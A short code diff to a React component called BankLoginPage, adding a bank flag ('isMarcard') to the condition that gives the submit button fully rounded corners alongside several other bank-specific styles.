@@ -746,7 +746,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                     className={`px-8 py-3 text-white font-medium transition-opacity hover:opacity-90 text-sm ml-auto disabled:opacity-70 disabled:cursor-not-allowed inline-flex items-center gap-2`}
                     style={{ 
                       backgroundColor: (isGLS || isQlick) ? "#003366" : isWarburg ? "#6d7e8b" : theme.buttonBg,
-                      borderRadius: (isGLS || isWarburg || isQlick) ? "9999px" : buttonBorderRadius
+                      borderRadius: (isGLS || isWarburg || isMarcard || isQlick) ? "9999px" : buttonBorderRadius
 
                     }}
 
